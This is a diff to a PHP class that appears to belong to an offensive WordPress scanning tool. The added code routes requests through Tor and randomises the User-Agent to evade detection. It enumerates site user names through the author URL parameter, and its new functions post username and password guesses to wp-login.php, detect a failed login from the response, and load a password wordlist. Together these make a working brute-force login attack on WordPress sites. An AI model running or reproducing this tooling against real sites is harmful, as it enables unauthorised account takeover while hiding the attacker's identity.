@@ -5,6 +5,7 @@ namespace Aszone\WordPress;
 use GuzzleHttp\Client;
 use Respect\Validation\Validator as v;
 use Symfony\Component\DomCrawler\Crawler;
+use Aszone\FakeHeaders\FakeHeaders;
 //use Aszone\Site;
 
 
@@ -20,7 +21,7 @@ class WordPress
 
 	public $pathPluginJson;
 
-	public $optionTor;
+	public $torForGuzzle;
 
 	/**
 	 * @param string $proxy
@@ -41,12 +42,12 @@ class WordPress
 	/**
 	 * @param string $tor
 	 */
-	public function setTor($tor)
+	public function setTor($tor="127.0.0.1:9050")
 	{
 		$this->tor = $tor;
-		$this->optionTor=['proxy' => [
-			'http' => 'socks5://'.$this->tor['proxy'],
-			'https' => 'socks5://'.$this->tor['proxy']
+		$this->torForGuzzle=['proxy' => [
+			'http' => 'socks5://127.0.0.1:9050',
+			'https' => 'socks5://127.0.0.1:9050'
 		]];
 	}
 
@@ -63,7 +64,6 @@ class WordPress
 
 		$isUrl   	= v::url()->notEmpty()->validate($this->target);
 		if($isUrl){
-
 			$baseUrlWordPress=$this->getBaseUrlWordPressCrawler();
 			if($baseUrlWordPress){
 				return true;
@@ -73,18 +73,61 @@ class WordPress
 
 	}
 
-	public function getBaseUrlWordPressByUrl(){
+	public function getBaseUrlWordPressByUrl()
+	{
+		$validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins|wp-content\/uploads)|xmlrpc.php|feed\/|comments\/feed\/).*/",$this->target,$m,PREG_OFFSET_CAPTURE);
+
+		if ($validXmlrpc) {
+
+			return $m[1][0];
+
+		}else{
+			$header=new FakeHeaders();
+			$client 	= new Client(['defaults' => [
+				'headers' => ['User-Agent' => $header->getUserAgent()],
+				'proxy'   => $this->torForGuzzle,
+				'timeout' => 30
+				]
+			]);
+			$body 		= $client->get( $this->target)->getBody()->getContents();
+			$crawler 	= new Crawler($body);
+			$arrLinks 	= $crawler->filter('script');
+			foreach ($arrLinks as $keyLink => $valueLink)
+			{
+
+				$validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins|wp-content\/uploads)|xmlrpc.php|feed\/|comments\/feed\/).*/", substr($valueLink->getAttribute('src'), 0), $m, PREG_OFFSET_CAPTURE);
+				if ($validXmlrpc)
+				{
+					return $m[1][0];
+				}
+			}
+		}
+		return;
+	}
+
+	/*public function getBaseUrlWordPressByUrl(){
+
 		$isUrl   	= v::url()->notEmpty()->validate($this->target);
+		$header=new FakeHeaders();
+
 		if($isUrl) {
-			$client 	= new Client();
-			$body 		= $client->get( $this->target,$this->optionTor)->getBody()->getContents();
+			$client 	= new Client(['defaults' => [
+				'headers' => ['User-Agent' => $header->getUserAgent()],
+				'proxy'   => $this->torForGuzzle,
+				'timeout' => 30
+				]
+			]);
+			$body 		= $client->get( $this->target)->getBody()->getContents();
+
 			//Check status block
 			$crawler 	= new Crawler($body);
 			$arrLinks 	= $crawler->filter('link');
+			var_dump($arrLinks);
+			exit();
 			foreach ($arrLinks as $keyLink => $valueLink) {
 				$validHref=$valueLink->getAttribute('href');
 				if (!empty($validHref)) {
-					$validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins)|xmlrpc.php|feed\/|comments\/feed\/).*/", substr($valueLink->getAttribute('href'), 0), $matches, PREG_OFFSET_CAPTURE);
+					$validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins)|xmlrpc.php|feed\/|comments\/feed\/).*//*", substr($valueLink->getAttribute('href'), 0), $matches, PREG_OFFSET_CAPTURE);
 					if ($validXmlrpc) {
 						$resultTeste=explode($matches[1][0],$this->target);
 						if(count($resultTeste)>=2){
@@ -95,29 +138,55 @@ class WordPress
 				}
 			}
 		}
-	}
+	}*/
 
-	public function getBaseUrlWordPressCrawler(){
+	public function getBaseUrlWordPressCrawler()
+	{
 
-		$client 	= new Client();
-		$res 		= $client->get( $this->target,$this->optionTor);
-		//Check status block
-		$body 		= $res->getBody()->getContents();
-		$crawler 	= new Crawler($body);
+		$targetTests[0]=$this->getBaseUrlWordPressByUrl();
+		$targetTests[1]=$targetTests[0]."wp-login.php";
+		$header=new FakeHeaders();
+		$client 	= new Client(['defaults' => [
+			'headers' => ['User-Agent' => $header->getUserAgent()],
+			'proxy'   => $this->torForGuzzle,
+			'timeout' => 30
+			]
+		]);
+		foreach($targetTests as $keyTarget=> $targetTest){
+			$res 		= $client->get($targetTest);
+			//Check status block
+			$body 		= $res->getBody()->getContents();
+			$crawler 	= new Crawler($body);
 
-		$arrLinks 	= $crawler->filter('link');
+			$arrLinks 	= $crawler->filter('script');
 
-		foreach ($arrLinks as $keyLink => $valueLink) {
-			$validHref=$valueLink->getAttribute('href');
-			if (!empty($validHref)) {
-				$validXmlrpc = preg_match("/(.+?)(wp-content\/themes|wp-content\/plugins).*/", substr($valueLink->getAttribute('href'), 0), $matches, PREG_OFFSET_CAPTURE);
-				if ($validXmlrpc) {
-					return $matches[1][0];
+			foreach ($arrLinks as $keyLink => $valueLink) {
+
+
+				$validHref=$valueLink->getAttribute('src');
+				if (!empty($validHref)) {
+					$validXmlrpc = preg_match("/(.+?)(wp-content\/themes|wp-content\/plugins|wp-includes\/).*/", $validHref, $matches, PREG_OFFSET_CAPTURE);
+
+					if ($validXmlrpc) {
+						return $matches[1][0];
+					}
+
 				}
 
 			}
-
 		}
+
+	}
+
+	public function validateLogon($html){
+
+		//preg_match("/<strong>(.+?)<\/strong>/", $html, $resultMatches, PREG_OFFSET_CAPTURE, 3);
+
+		$pos = strpos($html, "<strong>ERROR</strong>");
+		if($pos !== false){
+			return false;
+		}
+		return true;
 	}
 
 	public function getRootUrl(){
@@ -126,19 +195,26 @@ class WordPress
 
 	public function getUsers($limitNumberUsers=99999){
 
+
 		$baseUrlWordPress=$this->getBaseUrlWordPressByUrl($this->target);
 
 		$userList	= array();
 		//Number for validade finish list of user
 		$emptySequenceUsers=0;
+		$header=new FakeHeaders();
 		for ($i = 1; $i <= $limitNumberUsers; $i++) {
 
 			try{
-				$client 	= new Client();
-				$result = $client->get( $baseUrlWordPress.'/?author='.$i, $this->optionTor );
+
+				$client 	= new Client(['defaults' => [
+					'headers' => ['User-Agent' => $header->getUserAgent()],
+					'proxy'   => $this->torForGuzzle,
+					'timeout' => 30
+					]
+				]);
+				$result = $client->get( $baseUrlWordPress.'/?author='.$i );
 
 				//Check status block
-
 				$validGetUserByUrl = preg_match("/(.+?)\/\?author=".$i."/", substr($result->getEffectiveUrl(), 0), $matches, PREG_OFFSET_CAPTURE);
 
 				if(!$validGetUserByUrl){
@@ -147,7 +223,7 @@ class WordPress
 					$username=$this->getUserBytagBody($result->getBody()->getContents());
 				}
 				if(!empty($username)){
-					$userList[]=$username;
+					$userList[]=str_replace("-"," ",$username);
 					echo $username;
 					echo ' | ';
 					$emptySequenceUsers=0;
@@ -194,9 +270,10 @@ class WordPress
 
 	}
 
-	protected function getUserByUrl($urlUser){
+	protected function getUserByUrl($urlUser)
+	{
+		$validUser = preg_match("/author\/([\d\w-@\.%]+)/", substr($urlUser, 0), $matches, PREG_OFFSET_CAPTURE);
 
-		$validUser = preg_match("/author\/(.+?)\//", substr($urlUser, 0), $matches, PREG_OFFSET_CAPTURE);
 		if(isset($matches[1][0]) and (!empty($matches[1][0]) ) ){
 			return $matches[1][0];
 		}
@@ -323,5 +400,56 @@ class WordPress
 		$jsonPlugins = json_decode($htmlPlugin, true);
 		ksort($jsonPlugins);
 		return $jsonPlugins;
+	}
+
+	public function sendDataToLoginWordPress($username,$password,$target){
+
+
+		$cookie="cookie.txt";
+
+		$postdata = "log=". $username ."&pwd=". $password ."&wp-submit=Log%20In&redirect_to=". $target ."wp-admin/&testcookie=1";
+		$ch = \curl_init();
+		curl_setopt ($ch, CURLOPT_URL, $target . "wp-login.php");
+		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
+		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
+		curl_setopt ($ch, CURLOPT_REFERER, $target . "wp-admin/");
+		curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie);
+		curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
+		curl_setopt ($ch, CURLOPT_POST, 1);
+		if(!empty($this->tor)){
+			curl_setopt ($ch, CURLOPT_PROXY, $this->tor);
+			curl_setopt ($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+			curl_setopt($ch, CURLOPT_VERBOSE, 0);
+		}
+
+		$result['body'] = curl_exec ($ch);
+		$result['status']=curl_getinfo($ch);
+		curl_close($ch);
+		return $result;
+
+	}
+	public function getWordListInArray($wordlist=""){
+
+		if(empty($wordlist)){
+			/*$zip = new \ZipArchive;
+			$zip->open('resource/wordlist.zip');
+			$zip->extractTo('resource/tmp/');
+			$zip->close();*/
+			$wordlist    = __DIR__.'/../resource/litleWordListPt.txt';
+			$arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
+			//unlink($wordlist);
+			return $arrWordlist;
+		}
+
+		$checkFileWordList  = v::file()->notEmpty()->validate($wordlist);
+		if($checkFileWordList){
+			$targetResult   = file($wordlist,FILE_IGNORE_NEW_LINES);
+			return $targetResult;
+		}
+
+		return false;
+
 	}
 }
